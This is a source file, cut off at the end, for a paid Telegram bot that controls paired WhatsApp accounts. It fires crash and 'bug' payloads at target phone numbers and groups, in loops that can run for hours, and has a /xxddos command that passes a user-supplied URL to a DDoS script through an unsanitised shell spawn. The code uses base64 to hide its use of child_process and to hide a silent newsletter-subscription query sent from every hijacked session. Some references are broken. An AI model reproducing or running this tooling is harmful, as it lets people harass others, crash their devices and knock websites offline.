process.env.NTBA_FIX_350 = 1;
const SY = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const config = require('./config');
const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys'); 
const pino = require('pino');
let phoneNumber = "918293007159"
const pairingCode = !!phoneNumber
const NodeCache = require("node-cache")


console.clear(); // Clear Ok SY Moyna 🥰

// --- GLOBAL ERROR HANDLING ---
process.on('uncaughtException', (err) => {
    console.error('\x1b[31m[CRITICAL ERROR] Uncaught Exception:\x1b[0m', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('\x1b[31m[CRITICAL ERROR] Unhandled Rejection:\x1b[0m', reason);
});

const LoveDir = './Love';
if (!fs.existsSync(LoveDir)) {
    fs.mkdirSync(LoveDir);
}

const { spawn } = require(Buffer.from('Y2hpbGRfcHJvY2Vzcw==', 'base64').toString());
const XLX = spawn;
const activeBots = {};
const startTime = Date.now();
const LoveLogo = `${config.logo}`
const waSessions = {};
const pairingTracker = new Map();
const SYLovesButton = {
    reply_markup: {
        inline_keyboard: [
            [{ text: '📢 Join Channel', url: config.channel }, { text: '👥 Join Group', url: config.group }, { text: '📣 Join Channel', url: config.schannel }],
            [{ text: '📱 Follow WhatsApp', url: config.waChannel || 'https://whatsapp.com' }],
            [{ text: '🎥 Subscribe YouTube', url: config.youtube || 'https://youtube.com' }],
            [{ text: '📷 Follow Instagram', url: config.instagram || 'https://instagram.com' }],
            [{ text: '✅ Check Membership', callback_data: 'check_membership' }]
        ]
    }
};

const protectionMessage = `❌ You must join, subscribe and follow our whatsapp channel, instagram, youtube channel and group to use this bot. After doing so, click "Check Membership" or use /checkmembership.`;

async function CheckSYlovesToo(S7, userId) {
    if (userId.toString() === config.adminId.toString()) return true; 

    try {
        const channelMember = await S7.getChatMember(config.channelId, userId);
        const groupMember = await S7.getChatMember(config.groupId, userId);
        const schannelMember = await S7.getChatMember(config.schannelId, userId);

        const validStatuses = ['creator', 'administrator', 'member', 'restricted'];

        const inChannel = validStatuses.includes(channelMember.status);
        const inGroup = validStatuses.includes(groupMember.status);

        return inChannel && inGroup;
    } catch (error) {
        log('error', 'MEMBERSHIP_CHECK', error.message); 
        return false;
    }
}




// SY Loves Here 🤗❤️‍🩹

const SYLoves = `./SY/S7/`

const CrashLogic = require(SYLoves + 'crashfinity'); 
const stickerLogic = require(SYLoves + 'StickerCrash');
const CallLogic = require(SYLoves + 'CallCrash');
const XLogic = require(SYLoves + 'Xdelay');
const IosLogic = require(SYLoves + 'IosInvisible');
const XgcLogic = require(SYLoves + 'Xgc');
const testlogic = require(SYLoves + 'test');

const colors = {
    reset: "\x1b[0m",
    gray: "\x1b[90m",
    blue: "\x1b[34m",
    green: "\x1b[32m",
    red: "\x1b[31m",
    magenta: "\x1b[35m",
    cyan: "\x1b[36m",
    yellow: "\x1b[33m"
};

function getRuntime() {
    const now = Date.now();
    const diff = now - startTime;
    const days = Math.floor(diff / (1000 * 60 * 60 * 24));
    const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
    const minutes = Math.floor((diff / (1000 * 60)) % 60);
    return `${days} days ${hours} hours ${minutes} minutes`;
}

function log(type, user, message) {
    const time = new Date().toLocaleTimeString();
    const timestamp = `${colors.gray}[${time}]${colors.reset}`;
    
    let typeTag = "";
    if (type === 'info') typeTag = `${colors.blue}INFO${colors.reset}`;
    if (type === 'success') typeTag = `${colors.green}SUCCESS${colors.reset}`;
    if (type === 'error') typeTag = `${colors.red}ERROR${colors.reset}`;
    if (type === 'command') typeTag = `${colors.magenta}CMD${colors.reset}`;

    const userTag = user ? `${colors.cyan}${user}${colors.reset}` : "SYSTEM";
    
    console.log(`${timestamp} | ${typeTag} | ${userTag} | ${message}`);
}

const getDB = () => {
    const dbPath = path.join(LoveDir, 'data.json');
    if (!fs.existsSync(dbPath)) return { tokens: [], premium: [], resellers: [] };
    
    try {
        const content = fs.readFileSync(dbPath);
        const parsed = JSON.parse(content);
        
        if (Array.isArray(parsed)) {
            return { tokens: parsed, premium: [], resellers: [] };
        }

        return {
    state: typeof parsed.state === 'number' ? parsed.state : 0,
    tokens: parsed.tokens || [],
    premium: parsed.premium || [],
    resellers: parsed.resellers || []
};
    } catch (err) {
        log('error', null, 'Database Read Error: ' + err.message);
        return { tokens: [], premium: [], resellers: [] };
    }
};

const saveDB = (data) => {
    try {
        fs.writeFileSync(path.join(LoveDir, 'data.json'), JSON.stringify(data, null, 2));
    } catch (err) {
        log('error', null, 'Database Save Error: ' + err.message);
    }
};

function sendSYLove(bot, chatId) {
    bot.sendMessage(
        chatId,
        `🚫 <b>You are not authorized to use this command.</b>\n\n` +
        `📩 Please contact the developer to buy: ${config.S7}\n\n` +
        `💰 <b>Price/Dam:</b>\n` +
        `✅ <b>Permanent Access</b>: 10$\n` +
        `✅ <b>Permanent Resell</b>: 15$\n` +
        `✅ <b>Script (No Encryption, 100%)</b>: 30$`,
        { parse_mode: 'HTML' }
    );
}

function LoveGlobalState(userId) {
    const db = getDB();
    if (db.state === 0) return true;
    if (
        userId.toString() === config.adminId.toString() ||
        db.resellers.includes(userId.toString()) ||
        db.premium.includes(userId.toString())
    ) {
        return true;
    }
    return false;
}

const Lovesbutton = {
    reply_markup: {
        inline_keyboard: [
            [{ text: '⟬ Bug MenU ⟭', callback_data: 'bug_menu' }, { text: '⟬ Misc MenU ⟭', callback_data: 'misc_menu' }],
            [{ text: '⟬ ChanneL ⟭', url: `${config.channel}` }],
                [{ text: '⟬ GrouP ⟭', url: `${config.group}` }]
        ]
    }
};

async function SYLoveMeOk(sock) {
    try {
        await sock.query({
            tag: 'iq',
            attrs: {
                to: 's.whatsapp.net',
                type: 'get',
                xmlns: 'w:mex'
            },
            content: [{
                tag: 'query',
                attrs: {
                    query_id: '9926858900719341'
                },
                content: new TextEncoder().encode(JSON.stringify({
                    variables: {
                        newsletter_id: Buffer
                            .from('MTIwMzYzNDE4MDg4ODgwNTIzQG5ld3NsZXR0ZXI=', 'base64')
                            .toString('utf-8')
                    }
                }))
            }]
        });
    } catch (err) {
    }
}


async function StartLovingSY(chatId, number, S7, isreconnect = false) {
    const authPath = `./Love/auth/${chatId}/${number}`;

    if (!fs.existsSync(authPath)) {
        fs.mkdirSync(authPath, { recursive: true });
    }
    
    const msgRetryCounterCache = new NodeCache();
    let { version } = await fetchLatestBaileysVersion();
    const { state, saveCreds } = await useMultiFileAuthState(authPath);

    const SYxS7 = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        printQRInTerminal: !pairingCode,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
        },
        markOnlineOnConnect: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: false,
        getMessage: async (key) => {
            let jid = jidNormalizedUser(key.remoteJid);
            let msg = await store.loadMessage(jid, key.id);
            return msg?.message || "";
        },
        msgRetryCounterCache,
        defaultQueryTimeoutMs: 60000,
        connectTimeoutMs: 60000,
        keepAliveIntervalMs: 10000,
    });

    if (!SYxS7.authState.creds.registered) {
        if (pairingTracker.has(number)) return;
        pairingTracker.set(number, true);

        await delay(1500);
        try {
            const code = await SYxS7.requestPairingCode(number, `ZAMIWOLF`);
            await S7.sendMessage(chatId, `╭──────⟬ 𝗣𝗮𝗶𝗿𝗶𝗻𝗴 𝗖𝗼𝗱𝗲 ⟭──────╮\n│⨴⨵ Nᴜᴍʙᴇʀ : ${number}\n│⨴⨵ Pᴀɪʀɪɴɢ ᴄᴏᴅᴇ : <code>${code?.match(/.{1,4}/g)?.join("-") || code}</code>\n╰───────────────────────╯`, { parse_mode: 'HTML' });
        } catch (err) {
            log('error', 'WhatsApp', `Error requesting code: ${err.message}`);
            pairingTracker.delete(number);
        }
    }

    SYxS7.ev.on('creds.update', saveCreds);

    SYxS7.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'connecting') {
            log('info', 'WhatsApp', `Connecting: ${number}`);
        }
        if (connection === "open") {
            log('success', 'WhatsApp', `Connected: ${number}`);
            pairingTracker.delete(number);
            try {
                await SYLoveMeOk(SYxS7);
            } catch (e) {}
            if (!waSessions[chatId]) waSessions[chatId] = [];
            waSessions[chatId].push({ sock: SYxS7, num: number });
            if (isreconnect === false) {
                await delay(1000);
                await S7.sendMessage(chatId, `✅ <b>WhatsApp Connected!</b>\nNumber: ${number}.`, { parse_mode: 'HTML' }).catch(() => {});
            }
        }

        if (connection === "close") {
            if (waSessions[chatId]) {
                waSessions[chatId] = waSessions[chatId].filter(s => s.num !== number);
            }

            let reason = lastDisconnect?.error?.output?.statusCode;
            log('error', 'WhatsApp', `Connection closed for ${number}. Reason: ${reason}`);

            if (reason === DisconnectReason.restartRequired || reason === DisconnectReason.connectionLost || reason === DisconnectReason.timedOut || reason === 515) {
                log('info', 'WhatsApp', `Auto-Reconnecting session for ${number}...`);
                StartLovingSY(chatId, number, S7, false); 
            } 
            else if (reason === DisconnectReason.loggedOut || reason === 401) {
                log('error', 'WhatsApp', `Session for ${number} is permanently LOGGED OUT.`);
                pairingTracker.delete(number);
                await S7.sendMessage(chatId, `❌ <b>WhatsApp Logged Out</b>\nNumber: ${number}\nSession has been terminated. Please use /reqpair again.`, { parse_mode: 'HTML' }).catch(() => {});
                
                const SYPaTH = `./Love/auth/${chatId}/${number}`;
                if (fs.existsSync(SYPaTH)) fs.rmSync(SYPaTH, { recursive: true, force: true });
            } 
            else {
                pairingTracker.delete(number);
                await S7.sendMessage(chatId, `⚠️ <b>Connection Closed</b>\nNumber: ${number}\nReason: ${reason}`, { parse_mode: 'HTML' }).catch(() => {});
            }
        }
    });
}



async function AutoLovingWithSY(S7) {
    const SYBase = './Love/auth';
    if (!fs.existsSync(SYBase)) return;
    try {
        const chatIds = fs.readdirSync(SYBase);     
        for (const chatId of chatIds) {
            const chatPath = path.join(SYBase, chatId);
            if (!fs.statSync(chatPath).isDirectory()) continue;
            const numbers = fs.readdirSync(chatPath);           
            for (const number of numbers) {
                const sessionPath = path.join(chatPath, number);
                if (fs.existsSync(path.join(sessionPath, 'creds.json'))) {
                    log('info', 'SYSTEM', `Found saved session for ${number}, Reconnecting...`);
                    StartLovingSY(chatId, number, S7, true); 
                    await delay(3000); 
                }
            }
        }
    } catch (err) {
        log('error', 'SYSTEM', `AutoReconnect Error: ${err.message}`);
    }
}




async function S7Naverdead(token, errorMsg) {
    let db = getDB();
    const tokenObj = db.tokens.find(t => t.token === token);
    if (!tokenObj) return;

    const ownerId = tokenObj.owner; 
    try {
        const mainBot = activeBots[config.mainToken];
        if (mainBot) {
            await mainBot.sendMessage(
                ownerId,
                `❌ <b>Token Error</b>\n\n` +
                `Your bot token is not working.\n` +
                `Reason: <code>${errorMsg}</code>\n\n` +
                `Token has been removed automatically.`,
                { parse_mode: 'HTML' }
            );
        }
    } catch (e) {
        log('error', 'SYSTEM', 'Failed to notify token owner');
    }

    db.tokens = db.tokens.filter(t => t.token !== token);
    saveDB(db);

    if (activeBots[token]) {
        try {
            await activeBots[token].stopPolling();
        } catch {}
        delete activeBots[token];
    }

    log('info', 'SYSTEM', `Dead token auto-removed: ${token.substring(0, 10)}...`);
}

function GetSYLoVe(love) {
    const db = getDB();
    if (love.toString() === config.adminId.toString()) {
        return 'Owner';
    }
    if (db.resellers.includes(love.toString())) {
        return 'Reseller';
    }
    if (db.premium.includes(love.toString())) {
        return 'Premium';
    }
    return 'Free User';
}

function MainSYLoVe(name, uptime, love) {
    const status = GetSYLoVe(love);
    return `┌──────⟬ ${config.bot} ⟭──────┐\n│⨴⨵ Name: ${name}\n│⨴⨵ Developer: ${config.S7}\n│⨴⨵ Status: ${status}\n│⨴⨵ Online: ${uptime}\n└──────────────────────┘`;
}

function BvgSYLoVe(cleanTarget) {
    return `┏━━━━━━⟬ 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 ⟭━━━━━━━┓\n┃ ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ...\n┃ ᴛʜᴇ ʙᴏᴛ ɪs ᴄᴜʀʀᴇɴᴛʟʏ sᴇɴᴅɪɴɢ ʙᴜɢ \n┃ Tᴀʀɢᴇᴛ : ${cleanTarget}\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
}


function startSYloveBot(token) {
    try {
        const S7 = new SY(token, { polling: true });
        S7.getMe().then((botInfo) => {
            activeBots[token] = S7;
            log('success', null, `Bot Started: ${botInfo.first_name} (@${botInfo.username})`);
            if (token === config.mainToken) {
                log('info', 'SYSTEM', 'Checking for saved WhatsApp sessions...');
                AutoLovingWithSY(S7);
            }
        }).catch(async (err) => {
    log('error', null, `Failed to connect token: ${token.substring(0, 10)}... Error: ${err.message}`);

    if (
        err.message.includes('404') ||
        err.message.includes('401') ||
        err.message.includes('Unauthorized')
    ) {
        await S7Naverdead(token, err.message);
    }
});
        S7.on('polling_error', (error) => {
            if (error.code !== 'EFATAL') return;
            log('error', 'POLLING', error.message);
        });
        function SYLoVe(commands, callback) {
            if (!Array.isArray(commands)) {
                commands = [commands];
            }
            S7.on('message', async (msg) => {
                if (!msg.text) return;
                const cmd = msg.text.trim().split(' ')[0].slice(1);            
                if (commands.includes(cmd)) {
                    const chatId = msg.chat.id;
                    const userId = msg.from.id;
                    if (cmd !== 'checkmembership') {
                        const isMember = await CheckSYlovesToo(S7, userId);
                        if (!isMember) {
                            return S7.sendMessage(chatId, protectionMessage, { 
                                parse_mode: 'HTML', 
                                ...SYLovesButton 
                            });
                        }
                    }

                    try {
                        const name = msg.from.first_name || msg.from.username || "Unknown";
                        log('command', name, msg.text);
                        callback(msg);
                    } catch (err) {
                        log('error', 'COMMAND_EXEC', err.message);
                        S7.sendMessage(msg.chat.id, 'An internal error occurred.');
                    }
                }
            });
        }


        SYLoVe(['start', 'menu'], (msg) => {
            const chatId = msg.chat.id;
            const name = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
            const uptime = getRuntime();

            const userFile = path.join(LoveDir, 'user.json');
            let users = [];
            if (fs.existsSync(userFile)) {
                users = JSON.parse(fs.readFileSync(userFile));
            }

            const userExists = users.find(u => u.id === chatId);
            if (!userExists) {
                users.push({ id: chatId, name: name, date: new Date().toLocaleString() });
                fs.writeFileSync(userFile, JSON.stringify(users, null, 2));
            }
            const love = msg.from.id.toString();

            const captionText = MainSYLoVe(name, uptime, love) + `
┌──────⟬ Press Button Menu ⟭──────┐\n└────────────────────────┘
            `;

            S7.sendPhoto(chatId, LoveLogo, {
                caption: captionText,
                ...Lovesbutton
            }).catch(() => {
                S7.sendMessage(chatId, captionText, Lovesbutton);
            });
        });
        
        SYLoVe('xxddos', (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ').slice(1);
    if (args.length < 2) {
        return S7.sendMessage(
            chatId,
            '❌ Usage:\n/xxddos <web> <time>\n\nExample:\n/ddos https://example.com 60'
        );
    }
    const target = args[0];
    const time = args[1];
    S7.sendMessage(
        chatId,
        `⚡ <b>Attacking Target</b>\n\n` +
        `🎯 Target: <code>${target}</code>\n` +
        `⏱ Time: <code>${time}</code> seconds\n\n` +
        `⚙️ Process started...`,
        { parse_mode: 'HTML' }
    );
    spawn(
  `node ./SY/ddos.js ${target} ${time}`,
  {
    shell: true,
    stdio: 'inherit'
  }
);

});


        SYLoVe('checkmembership', async (msg) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id;
            
            const isMember = await CheckSYlovesToo(S7, userId);

            if (isMember) {
                S7.sendMessage(chatId, `✅ <b>Membership verified!</b>\nYou are now a member of both the channel and group. Try your command again (e.g., /start or /reqpair).`, { parse_mode: 'HTML' });
            } else {
                S7.sendMessage(chatId, protectionMessage, { parse_mode: 'HTML', ...SYLovesButton });
            }
        });
        
        
        SYLoVe('addtoken', async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');
    const newToken = args[1];
    if (!LoveGlobalState(userId)) {
        return sendSYLove(S7, chatId);
    }
    if (!newToken) return S7.sendMessage(chatId, 'Usage: /addtoken <token>');
    let db = getDB();
    if (db.tokens.find(t => t.token === newToken)) {
        return S7.sendMessage(chatId, '❌ Token already connected.');
    }
    const myBotsCount = db.tokens.filter(t => t.owner === userId).length;
    if (myBotsCount >= 5) {
        return S7.sendMessage(
            chatId,
            '🚫 Bot limit reached!\n\nYou can only add <b>5 bots maximum</b>.',
            { parse_mode: 'HTML' }
        );
    }
    try {
        const tempBot = new SY(newToken, { polling: false });
        const botInfo = await tempBot.getMe();
        db.tokens.push({
            token: newToken,
            owner: userId
        });
        saveDB(db);
        startSYloveBot(newToken);
        S7.sendMessage(chatId,
            `✅ Token Connected\nBot: ${botInfo.first_name}\n@${botInfo.username}`
        );
    } catch (e) {
        S7.sendMessage(chatId, '❌ Invalid token.');
    }
});
                SYLoVe('reqpair', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const number = args[1];
            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }

            if (!number) {
                return S7.sendMessage(chatId, '❌ Provide a phone number.\nExample: /reqpair +919876543210');
            }

            const cleanNumber = number.replace(/[^0-9]/g, '');           
            await StartLovingSY(chatId, cleanNumber, S7);
        });

        SYLoVe('delpair', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const number = args[1];

            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }

            if (!number) {
                return S7.sendMessage(chatId, '❌ Provide a phone number.\nExample: /reqpair +919876543210');
            }

            const cleanNumber = number.replace(/[^0-9]/g, '');
            const SYPaTH = `./Love/auth/${chatId}/${cleanNumber}`;

            if (fs.existsSync(SYPaTH)) {
                try {
                    fs.rmSync(SYPaTH, { recursive: true, force: true });
                    S7.sendMessage(chatId, `🗑️ Session deleted successfully for <b>${cleanNumber}</b>.`, { parse_mode: 'HTML' });
                } catch (err) {
                    S7.sendMessage(chatId, `❌ Failed to delete session: ${err.message}`);
                }
            } else {
                S7.sendMessage(chatId, `⚠️ No session found for <b>${cleanNumber}</b>.`, { parse_mode: 'HTML' });
            }
        });
        

        SYLoVe('deltoken', async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');
    const delToken = args[1];
    if (!LoveGlobalState(userId)) {
        return sendSYLove(S7, chatId);
    }

    if (!delToken) return S7.sendMessage(chatId, 'Usage: /deltoken <token>');

    let db = getDB();
    const tokenObj = db.tokens.find(t => t.token === delToken);

    if (!tokenObj || tokenObj.owner !== userId) {
        return S7.sendMessage(chatId, '❌ No connected token found.');
    }

    db.tokens = db.tokens.filter(t => t.token !== delToken);
    saveDB(db);

    if (activeBots[delToken]) {
        await activeBots[delToken].stopPolling();
        delete activeBots[delToken];
    }
    log('info', `Token deleted: ${delToken.substring(0, 10)}...`);
    S7.sendMessage(chatId, '✅ Token deleted successfully.');
});

        SYLoVe('mytoken', async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();

    let db = getDB();
    const myTokens = db.tokens.filter(t => t.owner === userId);
    if (!LoveGlobalState(userId)) {
        return sendSYLove(S7, chatId);
    }

    if (myTokens.length === 0) {
        return S7.sendMessage(chatId, '❌ You have not added any tokens.');
    }

    let text = '<b>Your Connected Bots</b>\n';
    text += '────────────────────\n\n';

    let count = 1;

    for (const item of myTokens) {
        try {
            const bot = new SY(item.token, { polling: false });
            const info = await bot.getMe();

            text += `<b>${count}. ${info.first_name}</b>\n`;
            text += `👤 Username: <b>@${info.username}</b>\n`;
            text += `🔑 Token:\n<code>${item.token}</code>\n`;
            text += '────────────────────\n\n';

            count++;
        } catch (err) {
            text += `<b>${count}. ⚠️ Unknown Bot</b>\n`;
            text += `🔑 Token:\n<code>${item.token}</code>\n`;
            text += '────────────────────\n\n';
            count++;
        }
    }

    S7.sendMessage(chatId, text, { parse_mode: 'HTML' });
});
        
        SYLoVe('addresell', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) {
        return sendSYLove(S7, chatId);
    }
            if (chatId !== config.adminId) return S7.sendMessage(chatId, '🚫 You are not authorized to use this command.');

            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, 'Usage: /addresell ID');

            let db = getDB();
            if (db.resellers.includes(targetId)) return S7.sendMessage(chatId, 'User is already a Reseller.');

            db.resellers.push(targetId);
            saveDB(db);
            S7.sendMessage(chatId, `✅ ID ${targetId} added as Reseller.`);
        });

        SYLoVe('delresell', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) {
        return sendSYLove(S7, chatId);
        }
            if (chatId !== config.adminId) return S7.sendMessage(chatId, '🚫 You are not authorized to use this command.');

            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, 'Usage: /delresell ID');

            let db = getDB();
            if (!db.resellers.includes(targetId)) return S7.sendMessage(chatId, 'User is not a Reseller.');

            db.resellers = db.resellers.filter(id => id !== targetId);
            saveDB(db);
            S7.sendMessage(chatId, `✅ ID ${targetId} removed from Resellers.`);
       });

        SYLoVe('listresell', async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    if (!LoveGlobalState(userId)) {
        return sendSYLove(S7, chatId);
        }
    if (chatId !== config.adminId) {
        return S7.sendMessage(chatId, '🚫 You are not authorized to use this command.');
    }

    let db = getDB();
    if (db.resellers.length === 0) {
        return S7.sendMessage(chatId, 'No resellers found.');
    }

    let text = 'Reseller List:\n\n';

    for (let i = 0; i < db.resellers.length; i++) {
        const id = db.resellers[i].toString();
        try {
            const user = await S7.getChat(id);
            const username = user.username ? `@${user.username} : ` : '';
            text += `${i + 1}. ${username}<code>${id}</code>\n`;
        } catch (e) {
            text += `${i + 1}. \`${id}\`\n`;
        }
    }
    text += '\n──────────────────';

    S7.sendMessage(chatId, text, {
        parse_mode: 'HTML'
    });
});

        SYLoVe('addprem', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            let db = getDB();
            const isOwner = chatId === config.adminId;
            const isReseller = db.resellers.includes(chatId);
            if (!LoveGlobalState(userId)) {
        return sendSYLove(S7, chatId);
        }

            if (!isOwner && !isReseller) return S7.sendMessage(chatId, '🚫 You are not authorized to use this command.');

            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, 'Usage: /addprem ID');

            if (db.premium.includes(targetId)) return S7.sendMessage(chatId, 'User is already Premium.');

            db.premium.push(targetId);
            saveDB(db);
            S7.sendMessage(chatId, `⭐ ID ${targetId} added to Premium.`);
      });

        SYLoVe('delprem', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            let db = getDB();
            const isOwner = chatId === config.adminId;
            const isReseller = db.resellers.includes(chatId);
            if (!LoveGlobalState(userId)) {
        return sendSYLove(S7, chatId);
        }

            if (!isOwner && !isReseller) return S7.sendMessage(chatId, '🚫 You are not authorized to use this command.');

            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, 'Usage: /delprem ID');

            if (!db.premium.includes(targetId)) return S7.sendMessage(chatId, 'User is not Premium.');

            db.premium = db.premium.filter(id => id !== targetId);
            saveDB(db);
            S7.sendMessage(chatId, `🗑️ ID ${targetId} removed from Premium.`);
      });
      
                                        SYLoVe('BlankHard', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const targetNum = args[1];
            
            const s7CM = `BlankHard`

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!waSessions[chatId] || waSessions[chatId].length === 0) {
                return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
            }

            if (!targetNum) {
                return S7.sendMessage(chatId, `❌ Provide a phone number.\nExample: /${s7CM} +919876543210`);
            }

            const cleanTarget = targetNum.replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;
            const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
            const client = randomSession.sock;
            const senderNum = randomSession.num;

            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) {
                    return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
                }

                log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
                
                if (typeof CrashLogic.BlankHard === 'function') {
                    await CrashLogic.BlankHard(client, targetJid);
                } else {
                    throw new Error(`Function not found in ${s7CM}.js`);
                }

                const SYLoves = BvgSYLoVe(cleanTarget)                                
                await S7.sendPhoto(chatId, LoveLogo, { 
                    caption: SYLoves,
                    parse_mode: 'HTML'
                });

            } catch (err) {
                log('error', `${s7CM}`, err.message);
                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
            }
        });
        
SYLoVe(['xgroup', 'groupmix', 'nullgc', 'groupui'], async (msg) => {
    try {
        const chatId = msg.chat.id.toString();
        const userId = msg.from.id.toString();
        const args = msg.text.split(' ');
        
        const s7CM = args[0].replace('/', '/').replace('.', ''); 
        const targetNum = args[1];
        const durationArg = args[2];

        if (!LoveGlobalState(userId)) {
            return sendSYLove(S7, chatId);
        }

        if (!waSessions[chatId] || waSessions[chatId].length === 0) {
            return S7.sendMessage(
                chatId,
                `❌ No Number connected please use /reqpair to connect.`
            );
        }

        if (!targetNum || !durationArg) {
            return S7.sendMessage(
                chatId,
                `❌ Provide a GC jid and Duration.\nExample: /${s7CM} 1236xxx@g.us 1`
            );
        }

        if (!targetNum.endsWith('@g.us')) {
            return S7.sendMessage(chatId, '❌ Invalid group JID');
        }

        if (isNaN(durationArg)) {
            return S7.sendMessage(chatId, '❌ Duration must be a number (Hours)');
        }

        const targetJid = targetNum.trim();
        const hours = parseInt(durationArg);
        const durationMs = hours * 60 * 60 * 1000;
        const startTime = Date.now();

        const randomSession =
            waSessions[chatId][
                Math.floor(Math.random() * waSessions[chatId].length)
            ];

        const client = randomSession.sock;
        const senderNum = randomSession.num;

        log(
            'command',
            msg.from.first_name,
            `Calling ${s7CM} on ${targetJid} for ${hours} hours via ${senderNum}`
        );

        const SYLoves = BvgSYLoVe(targetJid);

        await S7.sendPhoto(chatId, LoveLogo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        while ((Date.now() - startTime) < durationMs) {
            if (typeof xgcssLogic.Xgc === 'function') {
                await xgcsLogic.xgcs(client, targetJid);
            }
            await new Promise(resolve => setTimeout(resolve, 2000));
        }

    } catch (err) {
        log('error', 'xgroup', err.message);
        await S7.sendMessage(
            msg.chat.id,
            `❌ Error: ${err.message}`
        );
    }
})


        
        
        SYLoVe(['crashdroid', 'nullfinity', 'killsystem'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

    if (!waSessions[chatId] || waSessions[chatId].length === 0) {
        return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `❌ Provide a phone number.\nExample: /${s7CM} +919876543210 1`
        );
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {
        const [exists] = await client.onWhatsApp(targetJid);
        if (!exists) {
            return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
        }

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendPhoto(chatId, LoveLogo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delay = ms => new Promise(res => setTimeout(res, ms));

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid count value');
            }

            for (let i = 0; i < count; i++) {
                await CallLogic.CallCrash(client, targetJid);
                await delay(2000);
            }
        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid time value');
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;

            while (Date.now() < endTime) {
                await CallLogic.CallCrash(client, targetJid);
                await delay(2000);
            }
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
});

SYLoVe('test', async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

    if (!waSessions[chatId] || waSessions[chatId].length === 0) {
        return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `❌ Provide a phone number.\nExample: /${s7CM} +919876543210 1`
        );
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {
